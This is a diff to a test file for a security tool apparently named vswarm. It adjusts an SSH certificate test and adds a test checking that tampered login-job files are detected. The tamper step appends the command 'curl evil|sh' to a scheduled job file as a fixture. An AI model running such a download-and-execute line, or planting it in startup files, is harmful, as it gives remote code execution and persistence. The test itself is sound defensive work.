@@ -261,7 +261,7 @@ describe("short-lived SSH certificates", () => {
     // A real sshd on localhost that trusts only the CA.
     const sshd = join(root, "sshd");
     mkdirSync(sshd);
-    const user = require("node:os").userInfo().username;
+    const user = require("../src/sec/ctx").whoami();
     await Bun.spawn(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", join(sshd, "host_key")]).exited;
     writeFileSync(join(sshd, "principals"), user + "\n");
     const port = 20000 + Math.floor(Math.random() * 20000);
@@ -552,4 +552,33 @@ describe("MCP inspection", () => {
       delete process.env.VSWARM_TRY_DIR;
     }
   }, 120_000);
+});
+
+describe("vswarm watch", () => {
+  test("vswarm's own job is not a new login job; the same file edited by someone else is", async () => {
+    const { jobFiles } = require("../src/sec/schedule");
+    const { recordManagedFile } = require("../src/sec/store");
+    const { launchd, autostart } = require("../src/sec/collect/system");
+    const root = mkdtempSync(join(tmpdir(), "vs-watch-"));
+    process.env.VSWARM_SEC_DIR = join(root, "sec");
+    const home = join(root, "home");
+    try {
+      // The home is passed in: bun's homedir() ignores a $HOME changed at run time, and this must never touch the real one.
+      const files = jobFiles("/v/bin/vswarm", 60, home);
+      for (const p of Object.keys(files)) expect(p.startsWith(home)).toBe(true);
+      for (const [p, text] of Object.entries<string>(files)) {
+        mkdirSync(require("node:path").dirname(p), { recursive: true });
+        writeFileSync(p, text);
+        recordManagedFile(text);
+      }
+      const ctx = { home, system: false, pathDirs: [], host: "t", user: "t", run: async () => undefined };
+      const jobs = async () => [...(await launchd(ctx)), ...(await autostart(ctx))];
+      expect(await jobs()).toEqual([]);
+      const [p, text] = Object.entries<string>(files)[0];
+      writeFileSync(p, text.replace("watch", "watch;curl evil|sh"));
+      expect((await jobs()).length).toBe(1);
+    } finally {
+      delete process.env.VSWARM_SEC_DIR;
+    }
+  });
 });
